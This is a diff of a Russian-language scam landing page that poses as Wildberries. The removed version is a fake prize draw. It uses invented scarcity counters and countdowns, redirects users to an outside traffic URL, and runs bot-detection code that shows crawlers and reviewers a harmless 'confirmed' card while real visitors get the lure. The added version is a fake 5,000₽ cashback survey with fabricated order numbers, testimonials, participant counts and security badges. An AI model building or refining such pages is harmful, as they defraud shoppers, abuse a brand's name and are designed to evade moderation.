@@ -1,666 +1,992 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="referrer" content="no-referrer">
-    <title>Wildberries — Программа лояльности</title>
-    <style>
-        :root {
-            --wb-purple: #9360c8;
-            --wb-purple-dark: #7b4db5;
-            --bg: #f8f8fa;
-            --card-bg: #ffffff;
-            --text: #1a1a1a;
-            --sub: #8e8e93;
-            --border: #ececf0;
-            --gold: #c7973e;
-            --gold-light: rgba(199, 151, 62, 0.08);
-            --green: #34c759;
-            --green-bg: rgba(52, 199, 89, 0.08);
-            --red: #e54545;
-            --red-bg: rgba(229, 69, 69, 0.06);
-            --radius: 16px;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: var(--bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            min-height: 100dvh;
-            padding: 20px 16px;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            touch-action: manipulation;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        /* Карточка */
-        .card {
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 32px 24px 24px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.03), 0 8px 28px rgba(0,0,0,0.06);
-            text-align: center;
-        }
-        
-        /* Статусная строка */
-        .status-bar {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-        
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: var(--green-bg);
-            border-radius: 20px;
-            padding: 6px 14px;
-            font-size: 12px;
-            color: var(--green);
-            font-weight: 600;
-        }
-        
-        .status-dot {
-            width: 7px;
-            height: 7px;
-            background: var(--green);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.7); }
-        }
-        
-        /* ID профиля */
-        .profile-id {
-            font-size: 11px;
-            color: var(--sub);
-            margin-bottom: 20px;
-            letter-spacing: 0.02em;
-        }
-        
-        .profile-id span {
-            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
-            font-weight: 500;
-            color: #6e6e73;
-        }
-        
-        /* Логотип */
-        .logo {
-            width: 44px;
-            height: 44px;
-            margin: 0 auto 16px;
-            background: var(--wb-purple);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            font-weight: 800;
-            color: #ffffff;
-            letter-spacing: -0.5px;
-        }
-        
-        /* Заголовок */
-        .title {
-            font-size: 22px;
-            font-weight: 700;
-            color: var(--text);
-            letter-spacing: -0.03em;
-            line-height: 1.2;
-            margin-bottom: 6px;
-        }
-        
-        .title span {
-            color: var(--wb-purple);
-        }
-        
-        .subtitle {
-            font-size: 14px;
-            color: var(--sub);
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
-        
-        /* Призы */
-        .prizes-row {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-        
-        .prize-chip {
-            flex: 1;
-            background: var(--gold-light);
-            border-radius: 10px;
-            padding: 12px 8px;
-            text-align: center;
-        }
-        
-        .prize-chip-icon {
-            font-size: 24px;
-            margin-bottom: 4px;
-        }
-        
-        .prize-chip-name {
-            font-size: 11px;
-            color: var(--text);
-            font-weight: 600;
-            line-height: 1.2;
-        }
-        
-        .prize-chip-value {
-            font-size: 10px;
-            color: var(--gold);
-            font-weight: 700;
-            margin-top: 2px;
-        }
-        
-        /* Счётчик мест */
-        .counter-block {
-            background: var(--red-bg);
-            border-radius: 10px;
-            padding: 10px 14px;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        .counter-icon {
-            font-size: 16px;
-        }
-        
-        .counter-text {
-            font-size: 13px;
-            color: var(--text);
-            font-weight: 500;
-        }
-        
-        .counter-text strong {
-            color: var(--red);
-            font-weight: 700;
-        }
-        
-        /* Гарантия */
-        .guarantee {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #eef7ee;
-            border-radius: 20px;
-            padding: 6px 14px;
-            font-size: 12px;
-            color: #2d7a2d;
-            font-weight: 600;
-            margin-bottom: 18px;
-        }
-        
-        /* Таймер */
-        .timer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .timer-icon {
-            font-size: 16px;
-        }
-        
-        .timer-label {
-            font-size: 13px;
-            color: var(--sub);
-        }
-        
-        .timer-value {
-            font-size: 16px;
-            font-weight: 700;
-            color: var(--text);
-            font-variant-numeric: tabular-nums;
-            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
-            letter-spacing: 0.03em;
-        }
-        
-        .timer-value.urgent {
-            color: var(--red);
-        }
-        
-        /* Кнопка */
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            background: var(--wb-purple);
-            color: #ffffff;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            letter-spacing: -0.01em;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-            -webkit-user-select: none;
-            transition: transform 0.1s ease, box-shadow 0.15s ease, background 0.15s ease;
-            box-shadow: 0 4px 14px rgba(147, 96, 200, 0.3);
-        }
-        
-        .btn:active {
-            transform: scale(0.97);
-            background: var(--wb-purple-dark);
-            box-shadow: 0 6px 20px rgba(147, 96, 200, 0.45);
-        }
-        
-        .btn.loading {
-            pointer-events: none;
-            opacity: 0.8;
-        }
-        
-        .btn .spinner {
-            display: none;
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255,255,255,0.25);
-            border-top: 2px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-            margin: 0 auto;
-        }
-        
-        .btn.loading .btn-text { display: none; }
-        .btn.loading .spinner { display: block; }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .btn-hint {
-            font-size: 11px;
-            color: #b0b0b8;
-            margin-top: 10px;
-        }
-        
-        /* Футер */
-        .footer {
-            text-align: center;
-            font-size: 10px;
-            color: #c0c0c8;
-            margin-top: 18px;
-            line-height: 1.5;
-        }
-        
-        /* Лоадер */
-        .loader-wrap {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 14px;
-            padding: 40px 20px;
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            box-shadow: 0 1px 3px rgba(0,0,0,0.03), 0 8px 28px rgba(0,0,0,0.06);
-        }
-        
-        .loader-spin {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #ececf0;
-            border-top: 3px solid var(--wb-purple);
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        
-        .loader-text {
-            font-size: 14px;
-            color: var(--sub);
-        }
-        
-        /* Анимация */
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .fade {
-            opacity: 0;
-            animation: fadeUp 0.4s ease forwards;
-        }
-        .f1 { animation-delay: 0.05s; }
-        .f2 { animation-delay: 0.12s; }
-        .f3 { animation-delay: 0.20s; }
-        .f4 { animation-delay: 0.28s; }
-        .f5 { animation-delay: 0.36s; }
-        .f6 { animation-delay: 0.44s; }
-        .f7 { animation-delay: 0.52s; }
-        .f8 { animation-delay: 0.60s; }
-        
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Wildberries Premium | Ваш кэшбек 5000₽</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Unbounded:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: radial-gradient(circle at 20% 10%, #f8f4ff 0%, #ece6f7 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #1e1e2f;
+    }
+
+    .premium-card {
+      max-width: 480px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.75);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 48px;
+      box-shadow: 0 30px 60px rgba(101, 31, 162, 0.12), 0 10px 30px rgba(0, 0, 0, 0.05), inset 0 1px 0 rgba(255, 255, 255, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .hero {
+      padding: 32px 28px 20px;
+      text-align: center;
+      background: linear-gradient(160deg, #5b21b6 0%, #7c3aed 50%, #a855f7 100%);
+      position: relative;
+      overflow: hidden;
+      color: white;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -30%;
+      right: -10%;
+      width: 200px;
+      height: 200px;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .hero::after {
+      content: '';
+      position: absolute;
+      bottom: -20%;
+      left: -5%;
+      width: 150px;
+      height: 150px;
+      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .brand-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(4px);
+      padding: 8px 20px;
+      border-radius: 100px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+    }
+
+    .brand-tag .wb-logo {
+      background: white;
+      color: #5b21b6;
+      font-weight: 800;
+      font-family: 'Unbounded', sans-serif;
+      padding: 2px 8px;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .hero-amount {
+      font-family: 'Unbounded', sans-serif;
+      font-size: 64px;
+      font-weight: 800;
+      line-height: 1;
+      letter-spacing: -2px;
+      margin-bottom: 8px;
+      text-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero-subtitle {
+      font-size: 15px;
+      font-weight: 500;
+      opacity: 0.9;
+      margin-bottom: 8px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero-personal {
+      font-size: 14px;
+      font-weight: 600;
+      background: rgba(255, 255, 255, 0.18);
+      display: inline-block;
+      padding: 6px 16px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+      position: relative;
+      z-index: 1;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+    }
+
+    .meta-row {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 1;
+    }
+
+    .meta-badge {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(8px);
+      padding: 10px 18px;
+      border-radius: 40px;
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .survey-stage {
+      padding: 8px 28px 28px;
+      transition: opacity 0.4s;
+    }
+
+    .progress-indicator {
+      margin-bottom: 24px;
+    }
+
+    .progress-text {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      font-weight: 700;
+      color: #7c3aed;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      margin-bottom: 8px;
+    }
+
+    .progress-track {
+      height: 4px;
+      background: #ede4f5;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #7c3aed, #a855f7);
+      border-radius: 10px;
+      transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .question-card {
+      display: none;
+      animation: slideUpFade 0.5s ease;
+    }
+
+    .question-card.active {
+      display: block;
+    }
+
+    @keyframes slideUpFade {
+      from { opacity: 0; transform: translateY(24px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .question-text {
+      font-family: 'Unbounded', sans-serif;
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1025;
+      margin-bottom: 20px;
+      line-height: 1.3;
+    }
+
+    .options-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .option-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: white;
+      border: 1px solid #ede4f5;
+      border-radius: 20px;
+      padding: 16px 18px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+    }
+
+    .option-item:hover {
+      border-color: #a855f7;
+      background: #faf8ff;
+      transform: scale(1.02);
+      box-shadow: 0 8px 18px rgba(124, 58, 237, 0.12);
+    }
+
+    .option-radio {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #d4c4ea;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: 0.2s;
+    }
+
+    .option-item:hover .option-radio {
+      border-color: #7c3aed;
+    }
+
+    .option-radio::after {
+      content: '';
+      width: 10px;
+      height: 10px;
+      background: #7c3aed;
+      border-radius: 50%;
+      transform: scale(0);
+      transition: 0.2s;
+    }
+
+    .option-label {
+      font-size: 15px;
+      font-weight: 600;
+      color: #2d1b42;
+    }
+
+    .social-proof {
+      margin: 24px 0 8px;
+      background: rgba(248, 245, 255, 0.6);
+      backdrop-filter: blur(4px);
+      border-radius: 28px;
+      padding: 16px;
+      border: 1px solid rgba(124, 58, 237, 0.15);
+    }
+
+    .social-header {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      font-weight: 700;
+      color: #5b21b6;
+      margin-bottom: 12px;
+      padding: 0 4px;
+    }
+
+    .chat-feed {
+      max-height: 180px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding-right: 4px;
+    }
+
+    .chat-msg {
+      font-size: 12px;
+      background: white;
+      border-radius: 14px;
+      padding: 10px 14px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+      animation: gentlePop 0.3s ease;
+    }
+
+    @keyframes gentlePop {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .msg-name {
+      font-weight: 800;
+      color: #7c3aed;
+      margin-right: 6px;
+    }
+
+    .processing-stage {
+      display: none;
+      text-align: center;
+      padding: 40px 28px;
+    }
+
+    .processing-stage.active {
+      display: block;
+      animation: slideUpFade 0.4s ease;
+    }
+
+    .luxury-spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid #ede4f5;
+      border-top: 3px solid #7c3aed;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .final-stage {
+      display: none;
+      text-align: center;
+      padding: 24px 28px 32px;
+    }
+
+    .final-stage.active {
+      display: block;
+      animation: slideUpFade 0.5s ease;
+    }
+
+    .trophy-icon {
+      font-size: 56px;
+      margin-bottom: 8px;
+    }
+
+    .final-amount {
+      font-family: 'Unbounded', sans-serif;
+      font-size: 52px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #5b21b6, #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .gift-fund-bar {
+      background: rgba(255, 237, 213, 0.7);
+      backdrop-filter: blur(4px);
+      border-radius: 16px;
+      padding: 12px 16px;
+      margin: 16px 0 8px;
+      font-weight: 700;
+      font-size: 13px;
+      color: #9a3412;
+      text-align: left;
+    }
+
+    .fund-track {
+      height: 6px;
+      background: #ffe0b2;
+      border-radius: 10px;
+      margin-top: 8px;
+      overflow: hidden;
+    }
+
+    .fund-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #f97316, #ea580c);
+      border-radius: 10px;
+      width: 73.5%;
+      transition: width 2s ease;
+    }
+
+    .verification-scheme {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(248, 245, 255, 0.7);
+      backdrop-filter: blur(4px);
+      border-radius: 20px;
+      padding: 16px 12px;
+      margin: 16px 0;
+      border: 1px solid rgba(124, 58, 237, 0.2);
+      gap: 4px;
+    }
+
+    .scheme-step {
+      text-align: center;
+      font-size: 10px;
+      font-weight: 600;
+      color: #4a3a5c;
+      flex: 1;
+    }
+
+    .scheme-icon {
+      font-size: 24px;
+      margin-bottom: 4px;
+    }
+
+    .scheme-arrow {
+      color: #a855f7;
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .testimonial-card {
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(8px);
+      border-radius: 24px;
+      padding: 16px;
+      margin: 16px 0;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      border: 1px solid rgba(124, 58, 237, 0.15);
+      text-align: left;
+    }
+
+    .testimonial-avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #a78bfa, #7c3aed);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 800;
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+
+    .testimonial-text {
+      font-size: 13px;
+      color: #2d1b42;
+      line-height: 1.5;
+    }
+
+    .testimonial-name {
+      font-weight: 800;
+      color: #5b21b6;
+      display: block;
+      margin-top: 6px;
+    }
+
+    .testimonial-verified {
+      font-size: 11px;
+      color: #16a34a;
+      font-weight: 600;
+    }
+
+    .instruction-panel {
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(8px);
+      border-radius: 24px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: left;
+      border: 1px solid rgba(124, 58, 237, 0.2);
+    }
+
+    .instruction-panel ol {
+      padding-left: 20px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #2d1b42;
+    }
+
+    .instruction-panel li {
+      margin-bottom: 10px;
+      line-height: 1.4;
+    }
+
+    .urgent-banner {
+      background: rgba(255, 237, 213, 0.8);
+      backdrop-filter: blur(4px);
+      border-radius: 16px;
+      padding: 12px;
+      font-weight: 700;
+      color: #9a3412;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 16px 0;
+    }
+
+    .cta-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: linear-gradient(135deg, #5b21b6, #7c3aed);
+      color: white;
+      font-family: 'Unbounded', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      padding: 20px 28px;
+      border-radius: 60px;
+      text-decoration: none;
+      margin: 20px 0 12px;
+      box-shadow: 0 12px 28px rgba(91, 33, 182, 0.4);
+      transition: all 0.3s ease;
+      border: none;
+      width: 100%;
+      letter-spacing: 0.4px;
+      cursor: pointer;
+    }
+
+    .cta-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 20px 36px rgba(91, 33, 182, 0.5);
+    }
+
+    .security-badges {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+      font-size: 11px;
+      color: #6b5b7c;
+      font-weight: 600;
+    }
+
+    .security-badges span {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .pci-badge {
+      background: rgba(124, 58, 237, 0.08);
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 10px;
+      font-weight: 700;
+      color: #5b21b6;
+    }
+
+    /* Кнопка поддержки */
+    .support-widget {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 999;
+    }
+
+    .support-btn {
+      background: white;
+      border: 1px solid rgba(124, 58, 237, 0.3);
+      border-radius: 60px;
+      padding: 10px 20px;
+      font-weight: 700;
+      font-size: 13px;
+      color: #5b21b6;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+      backdrop-filter: blur(10px);
+      background: rgba(255, 255, 255, 0.85);
+      transition: all 0.2s;
+    }
+
+    .support-btn:hover {
+      box-shadow: 0 12px 28px rgba(91, 33, 182, 0.2);
+      border-color: #7c3aed;
+    }
+
+    .support-popup {
+      display: none;
+      position: absolute;
+      bottom: 60px;
+      right: 0;
+      background: white;
+      border-radius: 20px;
+      padding: 16px;
+      width: 260px;
+      box-shadow: 0 16px 32px rgba(0,0,0,0.15);
+      border: 1px solid rgba(124, 58, 237, 0.2);
+      font-size: 13px;
+      color: #2d1b42;
+      text-align: left;
+    }
+
+    .support-popup.active {
+      display: block;
+      animation: slideUpFade 0.3s ease;
+    }
+
+    .safe-note {
+      font-size: 12px;
+      color: #8e8ea0;
+      margin-top: 8px;
+    }
+
+    .floating-toast {
+      position: fixed;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,255,255,0.85);
+      backdrop-filter: blur(14px);
+      border-radius: 60px;
+      padding: 12px 24px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      font-weight: 700;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 1000;
+      animation: floatIn 0.4s ease;
+      border: 1px solid rgba(124,58,237,0.2);
+      white-space: nowrap;
+    }
+
+    @keyframes floatIn {
+      from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    @keyframes floatOut {
+      from { opacity: 1; transform: translateX(-50%) translateY(0); }
+      to { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+    }
+
+    @media (max-width: 480px) {
+      .hero-amount { font-size: 48px; }
+      .final-amount { font-size: 40px; }
+      .verification-scheme { flex-wrap: wrap; gap: 8px; }
+      .scheme-arrow { display: none; }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container" id="app">
-        
-        <!-- Лоадер -->
-        <div class="loader-wrap" id="loader">
-            <div class="loader-spin"></div>
-            <div class="loader-text">Загрузка...</div>
-        </div>
-        
-        <!-- Контент -->
-        <div id="content" style="display:none;">
-            <div class="card">
-                
-                <!-- Статус-бар -->
-                <div class="status-bar fade f1">
-                    <div class="status-badge">
-                        <span class="status-dot"></span>
-                        Окно открыто
-                    </div>
-                </div>
-                
-                <!-- ID профиля из письма -->
-                <div class="profile-id fade f1">
-                    Профиль <span id="profile-ref">WB-3472</span>
-                </div>
-                
-                <div class="logo fade f2">WB</div>
-                
-                <h1 class="title fade f3">
-                    Вы в <span>списке</span> участников
-                </h1>
-                <p class="subtitle fade f3">
-                    Закрытый розыгрыш призов для покупателей Wildberries. Гарантированный подарок каждому.
-                </p>
-                
-                <!-- Призы -->
-                <div class="prizes-row fade f4">
-                    <div class="prize-chip">
-                        <div class="prize-chip-icon">📱</div>
-                        <div class="prize-chip-name">iPhone 16</div>
-                        <div class="prize-chip-value">Главный</div>
-                    </div>
-                    <div class="prize-chip">
-                        <div class="prize-chip-icon">💳</div>
-                        <div class="prize-chip-name">Сертификат</div>
-                        <div class="prize-chip-value">100 000 ₽</div>
-                    </div>
-                    <div class="prize-chip">
-                        <div class="prize-chip-icon">🎁</div>
-                        <div class="prize-chip-name">Бокс</div>
-                        <div class="prize-chip-value">Каждому</div>
-                    </div>
-                </div>
-                
-                <!-- Счётчик мест -->
-                <div class="counter-block fade f5">
-                    <span class="counter-icon">🔥</span>
-                    <span class="counter-text">
-                        Осталось <strong id="spots-left">14</strong> из 500 мест
-                    </span>
-                </div>
-                
-                <!-- Гарантия -->
-                <div class="guarantee fade f5">
-                    ✅ Каждый участник получает приз
-                </div>
-                
-                <!-- Таймер -->
-                <div class="timer fade f6">
-                    <span class="timer-icon">⏳</span>
-                    <span class="timer-label">До закрытия:</span>
-                    <span class="timer-value" id="timer">01:59:47</span>
-                </div>
-                
-                <!-- Кнопка -->
-                <button class="btn fade f7" id="main-btn" onclick="handleClick()">
-                    <span class="btn-text">Принять участие</span>
-                    <span class="spinner"></span>
-                </button>
-                
-                <div class="btn-hint fade f7">
-                    Это займёт меньше минуты
-                </div>
-                
-            </div>
-            
-            <div class="footer fade f8">
-                🔒 Безопасное соединение<br>
-                Программа лояльности &bull; 2026
-            </div>
-        </div>
-        
+<div class="premium-card" id="appRoot">
+  <!-- Шапка -->
+  <div class="hero">
+    <div class="brand-tag"><span class="wb-logo">WB</span> ПРИВИЛЕГИИ</div>
+    <div class="hero-amount">5 000 ₽</div>
+    <div class="hero-subtitle">Именной кэшбек на карту</div>
+    <div class="hero-personal">👤 К заказу №4521098765</div>
+    <div class="meta-row">
+      <div class="meta-badge">⏳ <span id="heroTimer">23:59:59</span></div>
+      <div class="meta-badge">👤 <span id="participantCounter">2431</span> получили</div>
+    </div>
+  </div>
+
+  <!-- Этап опроса -->
+  <div class="survey-stage" id="surveyStage">
+    <div class="progress-indicator">
+      <div class="progress-text"><span>Вопрос <span id="currentQ">1</span>/7</span><span>для персонализации</span></div>
+      <div class="progress-track"><div class="progress-fill" id="progressFill" style="width: 0%;"></div></div>
     </div>
 
-    <script>
-    // ============================================
-    // НАСТРОЙКИ
-    // ============================================
-    var FINAL_URL = 'https://world-mining.pro/traff.php'; // ← ЗАМЕНИ
-    var LOADER_DELAY = 2000;
-    var TIMER_SECONDS = 7200; // 2 часа
-    
-    // ============================================
-    // ПАРАМЕТРЫ ИЗ URL
-    // ============================================
-    function getParams() {
-        var params = new URLSearchParams(window.location.search);
-        return {
-            token: params.get('token') || params.get('id') || params.get('d') || '',
-            all: window.location.search || ''
-        };
-    }
-    var urlParams = getParams();
-    
-    // ============================================
-    // ГЕНЕРАЦИЯ ID ПРОФИЛЯ
-    // ============================================
-    function generateProfileId() {
-        if (urlParams.token) {
-            return 'WB-' + urlParams.token.substring(0, 4).toUpperCase();
-        }
-        var chars = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
-        var id = '';
-        for (var i = 0; i < 4; i++) {
-            id += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return 'WB-' + id;
-    }
-    
-    // ============================================
-    // ПРОВЕРКА НА БОТА
-    // ============================================
-    function isRealUser() {
-        if (navigator.webdriver === true) return false;
-        if (!navigator.languages || navigator.languages.length === 0) return false;
-        if (screen.width < 150 || screen.height < 150) return false;
-        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
-        
-        var ua = navigator.userAgent;
-        var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
-        var hasMotion = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
-        
-        if (isMobile && (hasTouch || hasMotion)) return true;
-        
-        if (!isMobile) {
-            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
-            var hasMime = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
-            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
-            if (!hasPlugins && !hasMime && !hasChrome) return false;
-            if (navigator.hardwareConcurrency === 0) return false;
-        }
-        
-        return true;
-    }
-    
-    // ============================================
-    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
-    // ============================================
-    function showNeutral() {
-        document.getElementById('loader').style.display = 'none';
-        var c = document.getElementById('content');
-        c.style.display = 'block';
-        c.innerHTML = '<div class="card" style="text-align:center;"><div style="font-size:40px;margin-bottom:12px;">✓</div><h2 style="font-weight:600;font-size:18px;color:#1a1a1a;margin-bottom:6px;">Подтверждено</h2><p style="font-size:14px;color:#8e8e93;">Ваша заявка обработана.</p></div>';
-    }
-    
-    // ============================================
-    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
-    // ============================================
-    var userIsReal = false;
-    
-    function showReal() {
-        userIsReal = true;
-        
-        // Устанавливаем ID профиля
-        document.getElementById('profile-ref').textContent = generateProfileId();
-        
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('content').style.display = 'block';
-        
-        startTimer();
-        startSpotCounter();
-    }
-    
-    // ============================================
-    // ТАЙМЕР
-    // ============================================
-    var remaining = TIMER_SECONDS;
-    var timerInterval;
-    
-    function pad(n) {
-        return n < 10 ? '0' + n : '' + n;
-    }
-    
-    function updateTimer() {
-        var h = Math.floor(remaining / 3600);
-        var m = Math.floor((remaining % 3600) / 60);
-        var s = remaining % 60;
-        var el = document.getElementById('timer');
-        el.textContent = pad(h) + ':' + pad(m) + ':' + pad(s);
-        if (remaining < 600) el.classList.add('urgent');
-    }
-    
-    function startTimer() {
-        updateTimer();
-        timerInterval = setInterval(function() {
-            remaining--;
-            if (remaining <= 0) {
-                clearInterval(timerInterval);
-                document.getElementById('timer').textContent = '00:00:00';
-                document.getElementById('timer').classList.add('urgent');
-                return;
-            }
-            updateTimer();
-        }, 1000);
-    }
-    
-    // ============================================
-    // СЧЁТЧИК ОСТАВШИХСЯ МЕСТ
-    // ============================================
-    var spotsRemaining = 14;
-    var spotInterval;
-    
-    function updateSpotCounter() {
-        var el = document.getElementById('spots-left');
-        if (!el) return;
-        
